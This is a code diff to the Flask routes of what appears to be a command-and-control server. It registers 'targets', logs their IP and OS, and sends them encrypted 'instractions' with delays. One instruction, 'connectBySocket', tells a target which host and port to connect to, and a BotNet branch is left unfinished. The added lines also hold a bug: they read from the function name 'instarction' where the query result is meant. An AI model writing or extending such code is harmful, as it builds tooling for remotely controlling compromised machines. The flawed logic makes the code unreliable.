@@ -24,7 +24,7 @@ Routes list:
 - /api/socket/<target_name>: Manages socket connections for targets
 """
 
-from flask import Blueprint, jsonify, request, session, send_file
+from flask import Blueprint, jsonify, request
 from sqlalchemy.orm import sessionmaker
 from datetime import datetime
 from Crypto.Cipher import AES
@@ -32,7 +32,7 @@ import base64
 import json
 import os
 
-from db.modle import APICommand, APILink, ApiToken, Instraction, Targets, BotNet
+from db.modle import APICommand, APILink, ApiToken, Instraction, Targets, BotNet, Instraction_Detail
 from db.mange_db import config, _create_engine
 from utility.email_temp import email_temp
 from utility.processer import log, getlist, readFromJson, update_output, update_user_info, update_target_info, update_socket_info, update_code_output
@@ -277,22 +277,47 @@ def instarction(target_name):
     """
     if request.method == 'GET':
         try:
+
+            user_email = getlist(_session.query(Targets).filter_by(target_name=target_name).all(), sp=',')[0][1]
+            
+
             data = decrypt_payload(request.args)
 
             token = data.get('token')
+            if not token:
+                return jsonify(encrypt_payload({'error': 'please provide a valid api token. currently no api token provided'})), 403
             IP = data.get('ip')
             opratingSystem = data.get('os')
             valid = getlist(_session.query(ApiToken).filter_by(token=token).all(), sp=',')
 
             if len(valid) != 0:
                 instraction = getlist(_session.query(Instraction).filter_by(target_name=target_name, stutas=config.STUTAS[0]).all(), sp=',')
-                if len(instraction) != 0:
+                user_instractions = getlist(_session.query(Instraction_Detail).filter_by(user_email=user_email).all(), sp=',')
+
+                user_instraction = {
+                    'instraction': instarction[0][3],
+                    'Delay': instarction[0][1],
+                    'user_instarcton':{},
+                    'sys_instraction': {}
+                }
+                if len(user_instractions) != 0 and len(instraction) != 0:
                     if IP != readFromJson('target-info', target_name)['ip']:
                         update_target_info(target_name, IP, opratingSystem)
-                    return jsonify(encrypt_payload({'delay': instraction[0][1], 'instraction': instraction[0][3]})), 200
+                    if instraction[0][3] == config.INSTRACTION[1]:  # connectBySocket
+                        socket_info = getlist(_session.query(APILink).filter_by(target_name=target_name, action_type=config.ACTION_TYPE[1]).all(), sp=',')[0][3]
+                        user_instraction['sys_instraction'] = {
+                            'socket':{
+                                'host': socket_info.split(':')[0],
+                                'port': socket_info.split(':')[1]
+                            }
+                        }
+                    elif instraction[0][3] == config.INSTRACTION[2]:  # BotNet
+                        ...
+                    return jsonify(encrypt_payload(user_instraction)), 200
                 return jsonify(encrypt_payload({'Message': 'No instraction found'})), 404
             else:
-                return jsonify(encrypt_payload({'error': 'Invalid api token'})), 403
+                return jsonify(encrypt_payload({'Error': 'Invalid api_token. please provide a valid api token'})), 403
+        
         except Exception as e:
             log(f'[ERROR ROUT] : {request.endpoint} error: {str(e)}')
             return jsonify(encrypt_payload({'Error': f'Exception {str(e)}'})), 500
